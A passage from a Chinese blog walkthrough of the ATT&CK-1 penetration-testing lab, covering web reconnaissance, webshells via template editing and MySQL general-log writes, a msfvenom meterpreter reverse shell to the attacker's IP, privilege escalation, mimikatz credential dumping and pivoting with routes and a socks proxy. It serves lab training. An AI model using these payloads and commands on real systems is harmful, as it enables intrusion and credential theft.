class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line"></span><br><span class="line">kali ip:172.22.251.229</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line"></span><br><span class="line">win7 外网ip:172.22.8.128  内网ip:192.168.52.143</span><br><span class="line"></span><br><span class="line">win2k3 ip:192.168.52.141</span><br><span class="line"></span><br><span class="line">win2008 ip:192.168.52.138</span><br></pre></td></tr></table></figure><h4 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h4><p>最后在win7（web服务器）通过phpstudy启动服务，并在本地访问成功，就算正式部署好环境了<br><img src="/WEB/ATT&CK-1/image-20230421124829710.png" alt="image-20230421124829710"></p><p><img src="/WEB/ATT&CK-1/image-20230421124927290.png" alt="image-20230421124927290"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先我们知道了目标ip是172.22.8.128</p><p>使用nmap扫描目标开放的端口信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 172.22.8.128</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230421130654461.png" alt="image-20230421130654461"></p><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>看web服务就是phpStudy 探针，先进行目录爆破看看有没有泄露的</p><p><img src="/WEB/ATT&CK-1/image-20230421170620518.png" alt="image-20230421170620518"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://172.22.8.128/l.php</span><br><span class="line">http://172.22.8.128/phpinfo.php</span><br><span class="line">http://172.22.8.128/phpmyadmin/</span><br><span class="line">http://172.22.8.128/beifen.rar</span><br></pre></td></tr></table></figure><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>可以看到有泄露了一个beifen.rar</p><p>下载下来发现是网站的源码</p><p><img src="/WEB/ATT&CK-1/image-20230421170711332.png" alt="image-20230421170711332"></p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="数据库账号密码"><a href="#数据库账号密码" class="headerlink" title="数据库账号密码"></a>数据库账号密码</h4><p>浏览一下源码，发现泄露了数据库的用户名和密码（源码泄露后可以通过正则快速发现源码中的敏感信息）</p><p><img src="/WEB/ATT&CK-1/image-20230421172119015.png" alt="image-20230421172119015"></p><p>再结合上面目录爆破出的phpmyadmin，我们就可以通过泄露的用户名密码直接登录，可以看到数据库的用户名密码是弱口令，如果没有泄露源码，也可以直接弱口令爆破出正确密码。</p><h4 id="网站后台账号密码"><a href="#网站后台账号密码" class="headerlink" title="网站后台账号密码"></a>网站后台账号密码</h4><p>通过备份文件中的yxcms猜测网站路径，发现后台账号密码泄露（。。。。。。</p><p><img src="/WEB/ATT&CK-1/image-20230421172940784.png" alt="image-20230421172940784"></p><h2 id="漏洞挖掘-amp-利用"><a href="#漏洞挖掘-amp-利用" class="headerlink" title="漏洞挖掘&amp;利用"></a>漏洞挖掘&amp;利用</h2><h3 id="网站后台"><a href="#网站后台" class="headerlink" title="网站后台"></a>网站后台</h3><p>通过信息泄露登录后台</p><p><img src="/WEB/ATT&CK-1/image-20230421173140911.png" alt="image-20230421173140911"></p><h4 id="后台getshell思路"><a href="#后台getshell思路" class="headerlink" title="后台getshell思路"></a>后台getshell思路</h4><ol><li>后台数据库备份Getshell</li><li>各类上传Getshell</li><li>修改网站上传类型Getshell</li><li>上传其他脚本类型Getshell</li><li>编辑器漏洞Getshell</li><li>网站配置插马Getshell</li><li>编辑模版Getshell</li><li>修改脚本文件Getshell</li><li>……</li></ol><h4 id="编辑模板Getshell"><a href="#编辑模板Getshell" class="headerlink" title="编辑模板Getshell"></a>编辑模板Getshell</h4><h5 id="上传恶意模板文件"><a href="#上传恶意模板文件" class="headerlink" title="上传恶意模板文件"></a>上传恶意模板文件</h5><p>新建一个模板写一句话</p><p><img src="/WEB/ATT&CK-1/image-20230421174611290.png" alt="image-20230421174611290"></p><p><img src="/WEB/ATT&CK-1/image-20230421174554244.png" alt="image-20230421174554244"></p><p>上传成功想直接访问试试，但是不出意外not found了<br><img src="/WEB/ATT&CK-1/image-20230422112108151.png" alt="image-20230422112108151"></p><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>暂时不知道上传的模板文件去哪里了，还是先扫一下目录</p><p><img src="/WEB/ATT&CK-1/image-20230422112305406.png" alt="image-20230422112305406"></p><h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>发现扫出了不少东西，一一访问一下看看，发现public&#x2F; protected&#x2F; upload&#x2F;下居然都有目录遍历漏洞，那么我们就可以通过它来找到上传的模板文件了，都访问一下，终于在protected&#x2F;下找到了上传的模板文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/yxcms/protected/apps/default/view/default/</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230422112804683.png" alt="image-20230422112804683"></p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>然后就可以直接通过蚁剑连接了，成功Getshell</p><p><img src="/WEB/ATT&CK-1/image-20230422113313035.png" alt="image-20230422113313035"></p><h3 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h3><p>通过泄露的root root登录</p><p><img src="/WEB/ATT&CK-1/image-20230421172528505.png" alt="image-20230421172528505"></p><h4 id="phpmyadmin-Getshell思路"><a href="#phpmyadmin-Getshell思路" class="headerlink" title="phpmyadmin Getshell思路"></a>phpmyadmin Getshell思路</h4><ol><li>查询物理路径</li><li>查询secure_file_priv参数</li><li>select into outfile直接写入</li><li>日志GetShell</li><li>使用慢查询日志getsehll</li><li>使用错误日志getshell</li><li>新表GetShell</li><li>特殊版本GetShell</li></ol><h4 id="获取真实路径"><a href="#获取真实路径" class="headerlink" title="获取真实路径"></a>获取真实路径</h4><p><img src="/WEB/ATT&CK-1/image-20230422113835846.png" alt="image-20230422113835846"></p><p>猜测网站路径为：C:&#x2F;phpStudy&#x2F;www&#x2F;</p><h4 id="查询secure-file-priv参数"><a href="#查询secure-file-priv参数" class="headerlink" title="查询secure_file_priv参数"></a>查询secure_file_priv参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br></pre></td></tr></table></figure><p>发现值为NULL，无法通过select into outfile直接写入</p><p><img src="/WEB/ATT&CK-1/image-20230422122625392.png" alt="image-20230422122625392"></p><h4 id="尝试日志GetShell"><a href="#尝试日志GetShell" class="headerlink" title="尝试日志GetShell"></a>尝试日志GetShell</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p><h5 id="查询日志全局变量"><a href="#查询日志全局变量" class="headerlink" title="查询日志全局变量"></a>查询日志全局变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424114238106.png" alt="image-20230424114238106"></p><p>发现日志没有开启，且日志保存的路径不在网站目录下，那么我们需要修改一下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;    -- 打开日志保存</span><br><span class="line">set global general_log_file = &quot;C:/phpStudy/WWW/log.php&quot;; -- 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接</span><br></pre></td></tr></table></figure><p>再次查询<br><img src="/WEB/ATT&CK-1/image-20230424114530045.png" alt="image-20230424114530045"></p><h5 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[cmd]); ?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424114011597.png" alt="image-20230424114011597"></p><p>还写了两条语句方便理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php?&gt;&#x27;;</span><br><span class="line">select &#x27;&lt;?php echo&quot;123&quot;?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p>访问url</p><p><a href="http://172.22.8.128/log.php">http://172.22.8.128/log.php</a></p><p>发现了这三条记录，第一条引号里面是空的，第三条输出了123，说明成功写入并且成功解析为php代码并执行了</p><p><img src="/WEB/ATT&CK-1/image-20230424115736873.png" alt="image-20230424115736873"></p><p>通过蚁剑连接</p><p><img src="/WEB/ATT&CK-1/image-20230424115932455.png" alt="image-20230424115932455"></p><p>还有更多getshell方式等待你们尝试</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="/WEB/ATT&CK-1/image-20230424120407952.png" alt="image-20230424120407952"></p><h3 id="Windows提权思路"><a href="#Windows提权思路" class="headerlink" title="Windows提权思路"></a>Windows提权思路</h3><ol><li>内核溢出漏洞提权</li><li>BypassUAC</li><li>DLL劫持</li><li>引号路径</li><li>服务权限</li><li>进程注入</li><li>令牌窃取</li><li>AT&amp;SC&amp;PS命令</li></ol><h4 id="内核溢出漏洞提权的利用"><a href="#内核溢出漏洞提权的利用" class="headerlink" title="内核溢出漏洞提权的利用"></a>内核溢出漏洞提权的利用</h4><p>一般就是收集一下windows的补丁和版本信息，然后和已知漏洞对比，寻找可利用的exp</p><p>可以使用一些github的项目自动对比</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bitsadmin/wesng</span><br><span class="line">https://github.com/chroblert/WindowsVulnScan</span><br></pre></td></tr></table></figure><p>也可以使用cs和msf自动化</p><p>这里我就直接使用msf进行提权了</p><h3 id="利用msf提权"><a href="#利用msf提权" class="headerlink" title="利用msf提权"></a>利用msf提权</h3><h4 id="生成反弹后门"><a href="#生成反弹后门" class="headerlink" title="生成反弹后门"></a>生成反弹后门</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.251.229 LPORT=5555 -f exe -o msf.exe</span><br></pre></td></tr></table></figure><p>上传至<code>C:/phpStudy/tmp/</code>目录下，当然这里还有可以要用到免杀的知识，但是这个靶场并没有，等以后遇到了再写吧</p><p><img src="/WEB/ATT&CK-1/image-20230424130756744.png" alt="image-20230424130756744"></p><h4 id="配置监听会话"><a href="#配置监听会话" class="headerlink" title="配置监听会话"></a>配置监听会话</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424130941687.png" alt="image-20230424130941687"></p><p>然后在蚁剑执行反弹后门就行</p><p><img src="/WEB/ATT&CK-1/image-20230424131125156.png" alt="image-20230424131125156"></p><p><img src="/WEB/ATT&CK-1/image-20230424131144509.png" alt="image-20230424131144509"></p><p>有回显说明成功反弹shell</p><p>先background退出当前session，然后sessions查看session id</p><p><img src="/WEB/ATT&CK-1/image-20230424131612092.png" alt="image-20230424131612092"></p><h5 id="筛选EXP模块"><a href="#筛选EXP模块" class="headerlink" title="筛选EXP模块"></a>筛选EXP模块</h5><h6 id="半自动"><a href="#半自动" class="headerlink" title="半自动"></a>半自动</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424131952399.png" alt="image-20230424131952399"></p><h6 id="全自动"><a href="#全自动" class="headerlink" title="全自动"></a>全自动</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）</span><br><span class="line">set showdescription true</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>exp之后就会自动识别，然后输出</p><p><img src="/WEB/ATT&CK-1/image-20230424131856785.png" alt="image-20230424131856785"></p><p>但是这个靶机只需要<code>getsystem</code></p><p><img src="/WEB/ATT&CK-1/image-20230424134406382.png" alt="image-20230424134406382"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="收集密码"><a href="#收集密码" class="headerlink" title="收集密码"></a>收集密码</h3><h4 id="使用kiwi模块"><a href="#使用kiwi模块" class="headerlink" title="使用kiwi模块"></a>使用kiwi模块</h4><p>加载kiwi模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429115504034.png" alt="image-20230429115504034"></p><p>可以看到提示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!] <span class="title class_">Loaded</span> x86 <span class="title class_">Kiwi</span> on an x64 architecture</span><br></pre></td></tr></table></figure><p>报错解释回归到kiwi原理上：</p><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p><img src="/WEB/ATT&CK-1/image-20230429115827625.png" alt="image-20230429115827625"></p><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><p><img src="/WEB/ATT&CK-1/image-20230429120619900.png" alt="image-20230429120619900"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 488</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429120635610.png" alt="image-20230429120635610"></p><p>再load就没有报错了</p><p><img src="/WEB/ATT&CK-1/image-20230429120705919.png" alt="image-20230429120705919"></p><p>查看kiwi模块的使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">help kiwi</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429120744638.png" alt="image-20230429120744638"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure><p>使用creds_all获得本机密码</p><p><img src="/WEB/ATT&CK-1/image-20230429224629672.png" alt="image-20230429224629672"></p><h4 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h4><p>抓到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">hongrisec@win7</span><br></pre></td></tr></table></figure><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>这里借用一下迪总的图<br><img src="/WEB/ATT&CK-1/9dxsuZWjbEPQMl2vx1HSBA.png" alt="img"></p><h4 id="判断内网ip"><a href="#判断内网ip" class="headerlink" title="判断内网ip"></a>判断内网ip</h4><p>为192.168.52.1&#x2F;24</p><p><img src="/WEB/ATT&CK-1/image-20230429102446148.png" alt="image-20230429102446148"></p><h4 id="手动收集"><a href="#手动收集" class="headerlink" title="手动收集"></a>手动收集</h4><h5 id="shell后乱码"><a href="#shell后乱码" class="headerlink" title="shell后乱码"></a>shell后乱码</h5><p>进入shell后发现乱码，执行下面这条指令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chcp 65001</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">net time /domain        #查看时间服务器</span><br><span class="line">net user /domain        #查看域用户</span><br><span class="line">net view /domain        #查看有几个域</span><br><span class="line">net group &quot;domain computers&quot; /domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain admins&quot;   /domain          #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain       #查看域控</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429174428260.png" alt="image-20230429174428260"></p><h4 id="上传fscan"><a href="#上传fscan" class="headerlink" title="上传fscan"></a>上传fscan</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br> 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p><p><img src="/WEB/ATT&CK-1/image-20230429102521400.png" alt="image-20230429102521400"></p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>使用全部模块扫描内网</p><img src="/WEB/ATT&CK-1/image-20230429102712946.png" alt="image-20230429102712946" style="zoom:50%;"><h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.138  is alive</span><br><span class="line">(icmp) Target 192.168.52.143  is alive</span><br><span class="line">(icmp) Target 192.168.52.141  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">192.168.52.141:7001 open</span><br><span class="line">192.168.52.143:3306 open</span><br><span class="line">192.168.52.141:8099 open</span><br><span class="line">192.168.52.141:8098 open</span><br><span class="line">192.168.52.141:7002 open</span><br><span class="line">192.168.52.138:88 open</span><br><span class="line">192.168.52.141:445 open</span><br><span class="line">192.168.52.141:139 open</span><br><span class="line">192.168.52.143:445 open</span><br><span class="line">192.168.52.138:445 open</span><br><span class="line">192.168.52.143:139 open</span><br><span class="line">192.168.52.138:139 open</span><br><span class="line">192.168.52.141:135 open</span><br><span class="line">192.168.52.143:135 open</span><br><span class="line">192.168.52.138:135 open</span><br><span class="line">192.168.52.143:80 open</span><br><span class="line">192.168.52.138:80 open</span><br><span class="line">192.168.52.141:21 open</span><br><span class="line">[*] alive ports len is: 18</span><br><span class="line"></span><br><span class="line">start vulscan</span><br><span class="line"></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.143</span><br><span class="line">   [-&gt;]stu1</span><br><span class="line">   [-&gt;]192.168.52.143</span><br><span class="line">   [-&gt;]169.254.129.186</span><br><span class="line">   [-&gt;]172.22.8.128</span><br><span class="line">[+] 192.168.52.143      MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] NetBios: 192.168.52.143  stu1.god.org                        Windows 7 Professional 7601 Service Pack 1</span><br><span class="line"></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.138</span><br><span class="line">   [-&gt;]owa</span><br><span class="line">   [-&gt;]192.168.52.138</span><br><span class="line">[+] 192.168.52.138      MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br><span class="line"></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.141</span><br><span class="line">   [-&gt;]root-tvi862ubeh</span><br><span class="line">   [-&gt;]192.168.52.141</span><br><span class="line">   </span><br><span class="line">[*] WebTitle: http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor</span><br><span class="line">[*] NetBios: 192.168.52.138  [+]DC owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[+] 192.168.52.141      MS17-010        (Windows Server 2003 3790)</span><br><span class="line">[*] WebTitle: http://192.168.52.138     code:200 len:689    title:IIS7</span><br><span class="line">[+] ftp://192.168.52.141:21:anonymous</span><br><span class="line">[*] WebTitle: http://192.168.52.143     code:200 len:14749  title:phpStudy 探针 2014</span><br><span class="line">[*] WebTitle: http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel</span><br><span class="line">已完成 18/18</span><br><span class="line">[*] 扫描结束,耗时: 21.4177141s</span><br></pre></td></tr></table></figure><h4 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.143 web服务器 stu1</span><br><span class="line">MS17-010  </span><br><span class="line">端口开放：</span><br><span class="line">3306 mysql</span><br><span class="line">445  tcp</span><br><span class="line">139  SMB</span><br><span class="line">135 RPC</span><br><span class="line">80 http</span><br><span class="line"></span><br><span class="line">192.168.52.138  DC owa.god.org  </span><br><span class="line">MS17-010  </span><br><span class="line">端口开放：</span><br><span class="line">445  tcp</span><br><span class="line">139  SMB</span><br><span class="line">135  RPC</span><br><span class="line">88</span><br><span class="line">80   http</span><br><span class="line"></span><br><span class="line">192.168.52.141  root-tvi862ubeh</span><br><span class="line">MS17-010  </span><br><span class="line">端口开放：</span><br><span class="line">8099</span><br><span class="line">8098</span><br><span class="line">7002</span><br><span class="line">7001 Weblogic</span><br><span class="line">445  tcp</span><br><span class="line">139  SMB</span><br><span class="line">135 RPC</span><br><span class="line">80 http</span><br><span class="line">21   ftp</span><br></pre></td></tr></table></figure><h5 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从域信息收集可以得到以下信息：</span><br><span class="line"></span><br><span class="line">·  域：god.org</span><br><span class="line">·  域内有三个用户：administrator、ligang、liukaifeng01</span><br><span class="line">·  域内有俩台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(192.168.52.143)</span><br><span class="line">·  域控：OWA(192.168.52.138)</span><br><span class="line">·  域管理员：administrator</span><br></pre></td></tr></table></figure><h3 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>内网中添加路由主要是充当跳板功能， 其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往内网的路由，此路由的下一跳转发，即网关，是MSF攻击平台与被攻击目标建立的一个session会话。通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源</p><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">background</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429122238699.png" alt="image-20230429122238699"></p><p><img src="/WEB/ATT&CK-1/image-20230429123519055.png" alt="image-20230429123519055"></p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">show options</span><br><span class="line">set SESSION 2</span><br><span class="line">exploit</span><br><span class="line">route print</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429144413108.png" alt="image-20230429144413108"></p><h4 id="配置socks代理"><a href="#配置socks代理" class="headerlink" title="配置socks代理"></a>配置socks代理</h4><p>代理就是在我们的kali开启了一个socks代理，监听kali本地端口，然后再通过这个端口将流量转给msf，msf转发给路由，所以能将流量直接带入到内网中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429124400134.png" alt="image-20230429124400134"></p><h4 id="连接代理"><a href="#连接代理" class="headerlink" title="连接代理"></a>连接代理</h4><p>代理就是在我们的kali开启了一个socks代理，监听kali本地端口，然后再通过这个端口将流量转给msf，msf转发给路由，所以能将流量直接带入到内网中</p><p><strong>ProxyChains</strong></p><p>ProxyChains是Linux和其他Unix下的代理工具。 